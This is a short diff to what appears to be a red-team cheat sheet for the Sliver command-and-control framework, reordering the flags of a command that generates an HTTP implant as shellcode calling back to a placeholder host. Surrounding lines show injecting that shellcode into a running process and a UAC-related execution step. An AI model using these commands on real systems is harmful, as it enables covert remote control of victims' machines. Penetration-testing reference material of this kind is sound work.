@@ -490,7 +490,7 @@ sliver (NEARBY_LANGUAGE) > execute-shellcode <FILE>.bin uac               // exe
 
 ```c
 sliver (NEARBY_LANGUAGE) > interactive
-sliver (NEARBY_LANGUAGE) > generate --http acme.com --format shellcode --save /PATH/TO/BINARY
+sliver (NEARBY_LANGUAGE) > generate --format shellcode --http acme.com --save /PATH/TO/BINARY
 sliver (NEARBY_LANGUAGE) > execute-shellcode -p <PID> /PATH/TO/BINARY/<FILE>.bin
 ```
 
